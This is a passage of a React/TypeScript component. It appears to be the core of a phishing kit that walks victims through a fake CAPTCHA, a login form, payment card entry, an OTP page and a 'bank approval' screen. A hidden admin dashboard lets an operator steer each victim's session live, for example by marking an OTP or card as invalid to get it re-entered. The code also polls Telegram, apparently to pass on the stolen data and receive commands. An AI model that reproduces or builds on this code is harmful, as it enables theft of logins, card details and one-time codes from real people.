          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP' && step !== 'OTP_LOADING') setStep('OTP');
          else if (remote.adminAction === 'INVALID_OTP' && step !== 'OTP' && step !== 'OTP_LOADING') setStep('OTP');
          else if (remote.adminAction === 'BANK_APPROVAL' && step !== 'BANK_APPROVAL') setStep('BANK_APPROVAL');
          else if (remote.adminAction === 'INVALID_CARD' && step !== 'PAYMENT') setStep('PAYMENT');
          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL')) setStep('PAYMENT');
          else if (remote.adminAction === 'NORMAL' && step === 'OTP_LOADING') setStep('PAYMENT');
          else if (remote.adminAction === 'REDIRECT_OTP' && step === 'LOADING') setStep('OTP');
          
          currentData[idx] = { ...updated, adminAction: remote.adminAction };
        } else {
          currentData.push(updated);
        }
        
        localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(currentData));
        return updated;
      });
    }, 1000);
    
    return () => clearInterval(monitor);
  }, [step]);

  useEffect(() => {
    if (step === 'ADMIN') {
      const interval = setInterval(() => {
        const current = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
        setSessions(current.filter((s: SessionData) => s.lastActive > Date.now() - 300000));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [step]);

  useEffect(() => {
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === CONFIG_STORAGE_KEY && e.newValue) {
        setConfig(JSON.parse(e.newValue));
      }
    };
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);

  useEffect(() => {
    const poller = setInterval(async () => {
      await pollTelegram();
    }, 3000);
    return () => clearInterval(poller);
  }, []);

  const updateSession = (updates: Partial<SessionData>) => {
    if (!session) return;
    setSession(prev => prev ? { ...prev, ...updates } : null);
  };

  const handleCaptchaVerify = () => setStep('LOGIN');
  const handleLogin = () => setStep('PAYMENT');

  const renderStep = () => {
    if (!session && step !== 'ADMIN' && step !== 'BLOCKED') return <LoadingState message="Loading..." />;

    switch (step) {
      case 'CAPTCHA':
        return <SecurityCheck session={session!} updateSession={updateSession} onVerify={handleCaptchaVerify} />;
      case 'LOGIN':
        return <LoginForm session={session!} updateSession={updateSession} onLogin={handleLogin} />;
      case 'PAYMENT':
        return <PaymentForm session={session!} updateSession={updateSession} setStep={setStep} />;
      case 'OTP':
        return <OTPPage session={session!} updateSession={updateSession} sessionId={sessionId.current} setStep={setStep} />;
      case 'OTP_LOADING':
        return <LoadingState message="Verifying your code..." />;
      case 'BANK_APPROVAL':
        return <BankApproval updateSession={updateSession} />;
      case 'LOADING':
      case 'PROCESSING':
        return <LoadingState message="Processing your payment..." />;
      case 'BLOCKED':
        return (
          <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
            <div className="text-center">
              <div className="w-16 h-16 bg-red-600/20 rounded-full flex items-center justify-center mb-6">
                <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-4">Access Blocked</h2>
              <p className="text-[#a7a7a7]">Your access has been blocked due to suspicious activity.</p>
            </div>
          </div>
        );
      case 'ADMIN':
        return <AdminDashboard sessions={sessions} config={config} setConfig={setConfig} />;
      default:
        return <LoadingState message="Loading..." />;
    }
  };

  return renderStep();
}
